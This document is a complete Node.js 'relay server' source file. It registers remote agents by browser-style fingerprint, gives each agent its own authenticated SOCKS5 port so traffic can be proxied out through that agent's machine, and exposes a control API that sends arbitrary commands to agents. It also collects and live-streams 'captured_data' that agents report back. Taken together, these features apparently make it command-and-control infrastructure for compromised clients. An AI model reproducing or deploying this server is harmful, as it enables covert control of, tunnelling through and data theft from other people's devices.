require('dotenv').config();
const WebSocket = require('ws');
const https = require('https');
const fs = require('fs');
const express = require('express');
const socks = require('socksv5');
const crypto = require('crypto');
const winston = require('winston');
const http = require('http');
const selfsigned = require('selfsigned');

const logger = winston.createLogger({
    level: 'debug',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({ filename: 'error.log', level: 'error' }),
        new winston.transports.File({ filename: 'combined.log' })
    ]
});

if (process.env.NODE_ENV !== 'production') {
    logger.add(new winston.transports.Console({
        format: winston.format.simple()
    }));
}

class RelayServer {
    constructor() {
        this.app = express();
        this.server = http.createServer(this.app);
        this.wss = new WebSocket.Server({ server: this.server });
        this.agents = new Map(); // fingerprint -> agent info
        this.connections = new Map();
        this.portMap = new Map(); // fingerprint -> port data
        this.unregisteredAgents = new Map(); // temp ID -> {ws, remoteAddress, timestamp}
        this.portRange = { start: 1081, end: 1181 };
        this.socksServers = new Map();

        // Captured data
        this.capturedData = new Map(); // fingerprint -> array of captured data

        // Task management
        this.taskQueues = new Map(); // fingerprint -> array of tasks
        this.tasks = new Map(); // taskId -> task object
        this.taskResults = new Map(); // taskId -> result object

        // Server-Sent Events clients
        this.sseClients = new Set(); // Set of SSE response objects

        this.setupHealthCheck();
        this.setupControlServer();
        this.setupSocksServer();
    }

    setupHealthCheck() {
        this.app.get('/health', (req, res) => {
            res.json({
                status: 'healthy',
                activeAgents: this.agents.size,
                activeConnections: this.connections.size,
                allocatedPorts: this.portMap.size
            });
        });
    }

    setupControlServer() {
        // Create a standard HTTP server for the control endpoint
        const controlApp = express();
        const controlServer = http.createServer(controlApp);

        // CORS middleware
        controlApp.use((req, res, next) => {
            res.header('Access-Control-Allow-Origin', '*');
            res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
            res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');

            // Handle preflight requests
            if (req.method === 'OPTIONS') {
                res.sendStatus(200);
            } else {
                next();
            }
        });

        // Basic authentication middleware
        const basicAuth = (req, res, next) => {
            // Skip basic auth for /events endpoint (uses query param auth instead)
            if (req.path === '/events') {
                return next();
            }
            
            // Check for basic auth header
            const authHeader = req.headers.authorization;
            
            if (!authHeader || !authHeader.startsWith('Basic ')) {
                res.setHeader('WWW-Authenticate', 'Basic');
                return res.status(401).json({ error: 'Authentication required' });
            }
            
            // Verify credentials
            const base64Credentials = authHeader.split(' ')[1];
            const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
            const [username, password] = credentials.split(':');
            
            const isValid = username === process.env.PROXY_USER && 
                           password === process.env.PROXY_PASS;
            
            logger.info({
                event: 'control_server_auth_attempt',
                username,
                success: isValid
            });
            
            if (!isValid) {
                return res.status(401).json({ error: 'Invalid authentication credentials' });
            }
            
            next();
        };
        
        // Apply auth middleware to all routes
        controlApp.use(basicAuth);

        // Add JSON parsing middleware
        controlApp.use(express.json({ limit: '10mb' }));

        // Parse a command from the request body, the request contains:
        // The command object to relay
        // The fingerprint of the agent to relay the command to
        // It will return the taskId of the command
        controlApp.post('/command', (req, res) => {
            try {
                const { command, payload, fingerprint } = req.body;

                if (!command || !fingerprint) {
                    return res.status(400).json({
                        error: 'Missing required fields: command, fingerprint'
                    });
                }

                // Find agent by fingerprint
                const agent = this.agents.get(fingerprint);

                if (!agent) {
                    return res.status(404).json({
                        error: `No active agent found for fingerprint: ${fingerprint}`
                    });
                }

                // Generate task ID
                const taskId = crypto.randomUUID();

                // Create task object
                const task = {
                    taskId,
                    command,
                    payload: payload || {},
                    fingerprint,
                    status: 'queued',
                    createdAt: new Date().toISOString(),
                    updatedAt: new Date().toISOString()
                };

                agent.ws.send(JSON.stringify({
                    type: 'command',
                    taskId,
                    command,
                    payload
                }));

                // Store task
                this.tasks.set(taskId, task);

                // Add to agent's queue
                if (!this.taskQueues.has(fingerprint)) {
                    this.taskQueues.set(fingerprint, []);
                }
                this.taskQueues.get(fingerprint).push(task);

                // Broadcast task queued via SSE
                this.broadcastSSE('task_queued', {
                    taskId,
                    command,
                    fingerprint,
                    status: 'queued'
                });

                logger.info({
                    event: 'command_queued',
                    taskId,
                    command,
                    fingerprint
                });

                res.json({
                    taskId,
                    status: 'queued',
                    message: 'Command queued successfully'
                });

            } catch (error) {
                logger.error({
                    event: 'command_queue_error',
                    error: error.message
                });

                res.status(500).json({
                    error: 'Internal server error'
                });
            }
        });
        
        // Task status endpoint
        controlApp.get('/task/:taskId', (req, res) => {
            try {
                const { taskId } = req.params;
                
                if (!taskId) {
                    return res.status(400).json({ 
                        error: 'Missing taskId parameter' 
                    });
                }
                
                const task = this.tasks.get(taskId);
                
                if (!task) {
                    return res.status(404).json({ 
                        error: 'Task not found' 
                    });
                }
                
                // Include result if available
                const result = this.taskResults.get(taskId);
                
                const response = {
                    taskId: task.taskId,
                    command: task.command,
                    status: task.status,
                    createdAt: task.createdAt,
                    updatedAt: task.updatedAt,
                    fingerprint: task.fingerprint
                };

                if (result) {
                    response.result = result;
                }

                res.json(response);
                
            } catch (error) {
                logger.error({
                    event: 'task_status_error',
                    error: error.message
                });
                
                res.status(500).json({ 
                    error: 'Internal server error' 
                });
            }
        });
        
        // Connections endpoint - list all active connections
        controlApp.get('/connections', (req, res) => {
            const connectionList = [];

            for (const [connectionId, conn] of this.connections.entries()) {
                const age = Date.now() - conn.createdAt;
                connectionList.push({
                    connectionId,
                    fingerprint: conn.fingerprint,
                    address: conn.address,
                    port: conn.port,
                    ageMs: age,
                    ageSec: Math.floor(age / 1000),
                    bytesSent: conn.bytesSent,
                    bytesReceived: conn.bytesReceived,
                    socketDestroyed: conn.socket.destroyed
                });
            }

            // Sort by age descending (oldest first)
            connectionList.sort((a, b) => b.ageMs - a.ageMs);

            res.json({
                totalConnections: connectionList.length,
                connections: connectionList
            });
        });

        // Control endpoint
        controlApp.get('/info', (req, res) => {
            const agentInfo = [];
            const processedFingerprints = new Set();

            // Add active agents
            for (const [fingerprint, agent] of this.agents.entries()) {
                processedFingerprints.add(fingerprint);

                const connectionCount = Array.from(this.connections.values())
                    .filter(conn => conn.agent === agent.ws).length;

                agentInfo.push({
                    fingerprint,
                    ip: agent.remoteAddress,
                    port: agent.port,
                    active: true,
                    connectionCount,
                    lastSeen: agent.lastSeen,
                    platform: agent.fingerprintData?.platform,
                    userAgent: agent.fingerprintData?.userAgent
                });
            }

            // Add inactive but previously seen agents
            for (const [fingerprint, portData] of this.portMap.entries()) {
                // Skip fingerprints we've already processed (active agents)
                if (processedFingerprints.has(fingerprint)) {
                    continue;
                }

                agentInfo.push({
                    fingerprint,
                    port: portData.port,
                    active: false,
                    lastSeen: portData.lastSeen
                });
            }

            res.json(agentInfo);
        });
        
        // Server-Sent Events endpoint for task completion notifications
        // Note: EventSource doesn't support custom headers, so we use query param auth
        controlApp.get('/events', (req, res) => {
            // Check for auth via query parameter since EventSource can't send headers
            const authToken = req.query.auth;
            if (!authToken) {
                return res.status(401).json({ error: 'Missing auth token' });
            }
            
            // Decode and verify the auth token (should be base64 encoded "username:password")  
            try {
                const credentials = Buffer.from(authToken, 'base64').toString('ascii');
                const [username, password] = credentials.split(':');
                
                const isValid = username === process.env.PROXY_USER && 
                               password === process.env.PROXY_PASS;
                
                if (!isValid) {
                    return res.status(401).json({ error: 'Invalid authentication credentials' });
                }
            } catch (err) {
                return res.status(401).json({ error: 'Invalid auth token format' });
            }
            // Set headers for SSE
            res.writeHead(200, {
                'Content-Type': 'text/event-stream',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Cache-Control'
            });

            // Send initial connection message
            res.write('data: {"type": "connected", "message": "Connected to task events"}\n\n');

            // Add client to the set
            this.sseClients.add(res);

            logger.info({
                event: 'sse_client_connected',
                clientCount: this.sseClients.size
            });

            // Handle client disconnect
            req.on('close', () => {
                this.sseClients.delete(res);
                logger.info({
                    event: 'sse_client_disconnected',
                    clientCount: this.sseClients.size
                });
            });

            req.on('error', (err) => {
                logger.error({
                    event: 'sse_client_error',
                    error: err.message
                });
                this.sseClients.delete(res);
            });
        });
        
        // Start the control server on port 1080
        controlServer.listen(1080, '0.0.0.0', () => {
            logger.info({
                event: 'control_server_started',
                port: 1080
            });
        });
    }

    setupSocksServer() {
        let key, cert;
        try {
            key = fs.readFileSync('/opt/relay-server/certs/key.pem');
            cert = fs.readFileSync('/opt/relay-server/certs/cert.pem');
        } catch (err) {
            logger.warn({
                event: 'no_certificate_found',
                error: err.message
            });
            const attrs = [{ name: 'commonName', value: 'localhost' }];
            const pems = selfsigned.generate(attrs, { 
                days: 365,
                keySize: 2048,
                algorithm: 'sha256'
            });
            key = pems.private;
            cert = pems.cert;
        }
        
        const httpsServer = https.createServer({
            key: key,
            cert: cert
        });
        this.wss = new WebSocket.Server({ server: httpsServer });

        this.wss.on('connection', (ws, req) => {
            const remoteAddress = req.socket.remoteAddress;
            let isAuthorized = false;
            
            const authHeader = req.headers['authorization'];
            if (authHeader && authHeader.startsWith('Bearer ')) {
                const token = authHeader.slice(7);
                if (token === process.env.RELAY_TOKEN) {
                    isAuthorized = true;
                }
            }
            
            if (!isAuthorized) {
                const protocols = req.headers['sec-websocket-protocol'];
                if (protocols) {
                    const protocolList = protocols.split(',').map(p => p.trim());
                    for (const protocol of protocolList) {
                        if (protocol.startsWith('token.')) {
                            const token = protocol.slice(6);
                            if (token === process.env.RELAY_TOKEN) {
                                isAuthorized = true;
                                break;
                            }
                        }
                    }
                }
            }

            if (!isAuthorized) {
                logger.warn({
                    event: 'invalid_auth_attempt',
                    ip: remoteAddress,
                    hasAuthHeader: !!authHeader,
                    hasProtocols: !!req.headers['sec-websocket-protocol']
                });
                ws.close();
                return;
            }

            // Generate a temporary ID for this unregistered connection
            const tempId = crypto.randomUUID();

            // Store in unregistered pool waiting for registration message
            this.unregisteredAgents.set(tempId, {
                ws,
                remoteAddress,
                timestamp: Date.now()
            });

            logger.info({
                event: 'agent_connected_unregistered',
                tempId,
                ip: remoteAddress,
                message: 'Waiting for registration message with fingerprint'
            });

            ws.on('message', (message) => {
                try {
                    const data = JSON.parse(message.toString());

                    // Handle registration message
                    if (data.type === 'register') {
                        this.handleRegistration(tempId, data.fingerprint, ws);
                        return;
                    }

                    // Find which agent this message belongs to
                    let fingerprint = null;
                    for (const [fp, agent] of this.agents.entries()) {
                        if (agent.ws === ws) {
                            fingerprint = fp;
                            agent.lastSeen = Date.now();

                            if (this.portMap.has(fp)) {
                                this.portMap.get(fp).lastSeen = Date.now();
                            }
                            break;
                        }
                    }

                    // If agent not registered yet, ignore non-registration messages
                    if (!fingerprint) {
                        logger.warn({
                            event: 'message_from_unregistered_agent',
                            type: data.type,
                            tempId
                        });
                        return;
                    }

                    const connection = this.connections.get(data.connectionId);

                    if (data.type === 'command_response') {
                        this.taskResults.set(data.taskId, data.payload);
                        
                        // Get task info for the SSE event
                        const task = this.tasks.get(data.taskId);
                        
                        // Broadcast task completion via SSE
                        this.broadcastSSE('task_completed', {
                            taskId: data.taskId,
                            command: task ? task.command : 'unknown',
                            fingerprint: task ? task.fingerprint : 'unknown',
                            result: data.payload,
                            status: 'completed'
                        });
                        
                        logger.debug({
                            event: 'command_response',
                            taskId: data.taskId,
                            payload: data.payload
                        });
                        return;
                    } else if (data.type === 'captured_data') {
                        if (!this.capturedData.has(fingerprint)) {
                            this.capturedData.set(fingerprint, []);
                        }
                        this.capturedData.get(fingerprint).push(data);

                        // Get agent info for the SSE event
                        const agent = this.agents.get(fingerprint);

                        // Broadcast captured data via SSE
                        this.broadcastSSE('captured_data', {
                            fingerprint,
                            data: data.data,
                            dataType: data.dataType,
                            timestamp: new Date().toISOString()
                        });

                        logger.debug({
                            event: 'captured_data',
                            fingerprint,
                            data: data.data,
                            dataType: data.dataType
                        });
                        return;
                    }

                    if (connection && data.type === 'data') {
                        const msgId = data.msgId || crypto.randomBytes(4).toString('hex');
                        const buffer = Buffer.from(data.data, 'base64');

                        connection.bytesReceived += buffer.length;

                        logger.debug({
                            event: 'agent_data',
                            connectionId: data.connectionId,
                            msgId,
                            originalMsgId: data.originalMsgId,
                            dataLength: buffer.length,
                            totalReceived: connection.bytesReceived
                        });

                        try {
                            if (!connection.socket.destroyed) {
                                connection.socket.write(buffer, (err) => {
                                    if (err) {
                                        logger.error({
                                            event: 'socket_write_error',
                                            connectionId: data.connectionId,
                                            msgId,
                                            error: err.message
                                        });
                                        this.cleanupConnection(data.connectionId);
                                    } else {
                                        logger.debug({
                                            event: 'data_sent_succesfully',
                                            connectionId: data.connectionId,
                                            msgId,
                                            dataLength: buffer.length
                                        })
                                    }
                                });
                            } else {
                                logger.warn({
                                    event: 'socket_destroyed',
                                    connectionId: data.connectionId
                                });
                                this.cleanupConnection(data.connectionId);
                            }
                        } catch (err) {
                            logger.error({
                                event: 'socket_write_exception',
                                connectionId: data.connectionId,
                                error: err.message
                            });
                            this.cleanupConnection(data.connectionId);
                        }
                    } else if (connection && data.type === 'close') {
                        logger.info({
                            event: 'agent_close_request',
                            connectionId: data.connectionId,
                            fingerprint
                        });
                        this.cleanupConnection(data.connectionId);
                    } else if (!connection && (data.type === 'close' || data.type === 'data')) {
                        // Connection already cleaned up - send explicit close to client to stop retries
                        // This happens when SOCKS client closes before agent finishes sending data
                        logger.debug({
                            event: data.type === 'close' ? 'late_close' : 'late_data',
                            connectionId: data.connectionId,
                            action: 'sending_close_to_stop_retries'
                        });

                        // Find agent and send close message
                        for (const [fp, agent] of this.agents.entries()) {
                            if (agent.ws === ws) {
                                agent.ws.send(JSON.stringify({
                                    type: 'close',
                                    connectionId: data.connectionId
                                }));
                                break;
                            }
                        }
                    } else {
                        logger.warn({
                            event: 'unhandled_message',
                            type: data.type,
                            connectionId: data.connectionId,
                            hasConnection: !!connection
                        });
                    }
                } catch (err) {
                    logger.error({
                        event: 'message_processing_error',
                        error: err.message,
                        message: message.toString()
                    });
                }
            });

            ws.on('close', () => {
                // Find which fingerprint this WebSocket belongs to
                let fingerprint = null;
                for (const [fp, agent] of this.agents.entries()) {
                    if (agent.ws === ws) {
                        fingerprint = fp;
                        break;
                    }
                }

                if (fingerprint) {
                    const agent = this.agents.get(fingerprint);
                    logger.info({
                        event: 'agent_disconnected',
                        fingerprint,
                        ip: remoteAddress,
                        port: agent.port
                    });

                    if (this.portMap.has(fingerprint)) {
                        this.portMap.get(fingerprint).lastSeen = Date.now();
                    }

                    // Close all connections for this agent
                    for (const [connectionId, connection] of this.connections.entries()) {
                        if (connection.agent === ws) {
                            this.cleanupConnection(connectionId);
                        }
                    }

                    // Remove the agent but keep the fingerprint mapping and port allocation
                    // so that if this fingerprint reconnects, it will get the same port
                    this.agents.delete(fingerprint);
                } else {
                    // Agent never registered, remove from unregistered pool
                    this.unregisteredAgents.delete(tempId);
                    logger.info({
                        event: 'unregistered_agent_disconnected',
                        tempId,
                        ip: remoteAddress
                    });
                }
            });
            
            const pingInterval = setInterval(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.ping();
                } else {
                    clearInterval(pingInterval);
                }
            }, 30000);

            ws.on('pong', () => {
                ws.isAlive = true;
                // Find which fingerprint this WebSocket belongs to
                for (const [fingerprint, agent] of this.agents.entries()) {
                    if (agent.ws === ws) {
                        agent.lastSeen = Date.now();

                        if (this.portMap.has(fingerprint)) {
                            this.portMap.get(fingerprint).lastSeen = Date.now();
                        }
                        break;
                    }
                }
            });
        });
        
        httpsServer.listen(process.env.PORT, '0.0.0.0', () => {
            logger.info({
                event: 'websocket_server_started',
                port: process.env.PORT
            });
        });
        
        setInterval(() => {
            this.checkStaleConnections();
        }, 60000);
    }

    handleRegistration(tempId, fingerprintData, ws) {
        const unregistered = this.unregisteredAgents.get(tempId);
        if (!unregistered) {
            logger.error({
                event: 'registration_for_unknown_temp_id',
                tempId
            });
            return;
        }

        const fingerprint = fingerprintData.hash;
        let isReconnect = false;

        // Check if this fingerprint already exists (reconnection)
        if (this.agents.has(fingerprint)) {
            const existingAgent = this.agents.get(fingerprint);
            isReconnect = true;

            // Close old WebSocket if it's different
            if (existingAgent.ws && existingAgent.ws !== ws) {
                logger.info({
                    event: 'replacing_existing_fingerprint_connection',
                    fingerprint,
                    oldIp: existingAgent.remoteAddress,
                    newIp: unregistered.remoteAddress
                });

                try {
                    existingAgent.ws.close();
                } catch (err) {
                    // Ignore errors
                }
            }
        }

        // Create/update agent info
        const agentInfo = {
            ws,
            remoteAddress: unregistered.remoteAddress,
            lastSeen: Date.now(),
            port: this.getPortForAgent(fingerprint),
            fingerprintData,
            registeredAt: Date.now()
        };

        this.agents.set(fingerprint, agentInfo);
        this.unregisteredAgents.delete(tempId);

        // Ensure SOCKS server for this agent
        this.ensureSocksServerForAgent(fingerprint, agentInfo);

        logger.info({
            event: isReconnect ? 'agent_registered_reconnect' : 'agent_registered',
            fingerprint,
            ip: unregistered.remoteAddress,
            port: agentInfo.port,
            platform: fingerprintData.platform,
            userAgent: fingerprintData.userAgent
        });
    }

    getPortForAgent(fingerprint) {
        if (this.portMap.has(fingerprint)) {
            return this.portMap.get(fingerprint).port;
        }

        const usedPorts = new Set(Array.from(this.portMap.values()).map(data => data.port));

        for (let port = this.portRange.start; port <= this.portRange.end; port++) {
            if (!usedPorts.has(port)) {
                this.portMap.set(fingerprint, {
                    port,
                    lastSeen: Date.now()
                });
                return port;
            }
        }

        logger.error({
            event: 'port_allocation_failed',
            fingerprint,
            message: 'All ports in range are allocated'
        });

        return this.portRange.start;
    }

    ensureSocksServerForAgent(fingerprint, agentInfo) {
        const port = agentInfo.port;

        if (this.socksServers.has(port)) {
            return;
        }

        const socksServer = socks.createServer((info, accept, deny) => {
            const connectionId = crypto.randomUUID();

            let targetAgent = null;
            let targetFingerprint = null;
            for (const [fp, agent] of this.agents.entries()) {
                if (agent.port === port) {
                    targetAgent = agent.ws;
                    targetFingerprint = fp;
                    break;
                }
            }

            if (!targetAgent) {
                logger.error({
                    event: 'no_agent_for_port',
                    port,
                    address: info.dstAddr,
                    dstPort: info.dstPort
                });
                return deny();
            }

            const socket = accept(true);

            this.connections.set(connectionId, {
                socket,
                agent: targetAgent,
                fingerprint: targetFingerprint,
                address: info.dstAddr,
                port: info.dstPort,
                createdAt: Date.now(),
                bytesReceived: 0,
                bytesSent: 0
            });

            logger.info({
                event: 'new_connection',
                connectionId,
                fingerprint: targetFingerprint,
                address: info.dstAddr,
                port: info.dstPort,
                agentPort: port,
                totalConnections: this.connections.size
            });

            targetAgent.send(JSON.stringify({
                type: 'connect',
                connectionId,
                targetHost: info.dstAddr,
                targetPort: info.dstPort
            }));

            socket.on('data', (data) => {
                const clientMsgId = crypto.randomBytes(4).toString('hex');
                const buffer = Buffer.from(data);

                const conn = this.connections.get(connectionId);
                if (conn) {
                    conn.bytesSent += data.length;
                }

                logger.debug({
                    event: 'client_data',
                    connectionId,
                    msgId: clientMsgId,
                    dataLength: data.length,
                    totalSent: conn ? conn.bytesSent : 0
                });
                if (this.connections.has(connectionId)) {
                    targetAgent.send(JSON.stringify({
                        type: 'data',
                        connectionId,
                        msgId: clientMsgId,
                        data: buffer.toString('base64')
                    }));
                }
            });

            socket.on('end', () => {
                logger.info({
                    event: 'socket_end',
                    connectionId,
                    fingerprint: targetFingerprint,
                    address: info.dstAddr,
                    port: info.dstPort
                });
                targetAgent.send(JSON.stringify({
                    type: 'close',
                    connectionId
                }));
            });

            socket.on('error', (err) => {
                logger.error({
                    event: 'socket_error',
                    connectionId,
                    fingerprint: targetFingerprint,
                    error: err.message
                });
                targetAgent.send(JSON.stringify({
                    type: 'close',
                    connectionId
                }));
            });
        });
        
        socksServer.useAuth(socks.auth.UserPassword((user, password, cb) => {
            const isValid = user === process.env.PROXY_USER && 
                           password === process.env.PROXY_PASS;            
            logger.info({
                event: 'proxy_auth_attempt',
                username: user,
                port,
                validUser: user === process.env.PROXY_USER,
                validPass: password === process.env.PROXY_PASS,
                success: isValid
            });
            
            cb(isValid);
        }));

        socksServer.listen(port, '0.0.0.0', () => {
            logger.info({
                event: 'socks_server_started',
                port,
                fingerprint
            });
            this.socksServers.set(port, socksServer);
        });
    }

    cleanupConnection(connectionId) {
        const connection = this.connections.get(connectionId);
        if (connection) {
            const age = Date.now() - connection.createdAt;

            connection.socket.destroy();
            this.connections.delete(connectionId);

            if (connection.agent.readyState === WebSocket.OPEN) {
                connection.agent.send(JSON.stringify({
                    type: 'close',
                    connectionId
                }));
            }

            logger.info({
                event: 'connection_closed',
                connectionId,
                fingerprint: connection.fingerprint,
                address: connection.address,
                port: connection.port,
                ageMs: age,
                bytesSent: connection.bytesSent,
                bytesReceived: connection.bytesReceived,
                remainingConnections: this.connections.size
            });
        }
    }

    validateAuth(authHeader) {
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return false;
        }

        const token = authHeader.slice(7);
        return token === process.env.RELAY_TOKEN;
    }

    checkStaleConnections() {
        const now = Date.now();
        for (const [connectionId, connection] of this.connections.entries()) {
            if (now - connection.createdAt > 12 * 60 * 60 * 1000) {
                logger.info({
                    event: 'cleaning_stale_connection',
                    connectionId,
                    age: (now - connection.createdAt) / 1000
                });
                this.cleanupConnection(connectionId);
            }
        }
    }

    // Broadcast event to all SSE clients
    broadcastSSE(eventType, data) {
        if (this.sseClients.size === 0) return;

        const eventData = JSON.stringify({
            type: eventType,
            timestamp: new Date().toISOString(),
            ...data
        });

        // Remove disconnected clients
        const disconnectedClients = new Set();

        for (const client of this.sseClients) {
            try {
                client.write(`data: ${eventData}\n\n`);
            } catch (err) {
                logger.error({
                    event: 'sse_broadcast_error',
                    error: err.message
                });
                disconnectedClients.add(client);
            }
        }

        // Clean up disconnected clients
        for (const client of disconnectedClients) {
            this.sseClients.delete(client);
        }

        logger.debug({
            event: 'sse_broadcast',
            eventType,
            clientCount: this.sseClients.size,
            data
        });
    }
}

process.on('uncaughtException', (err) => {
    logger.error({
        event: 'uncaught_exception',
        error: err.message,
        stack: err.stack
    });
});

process.on('unhandledRejection', (reason, promise) => {
    logger.error({
        event: 'unhandled_rejection',
        error: reason
    });
});

const relay = new RelayServer();
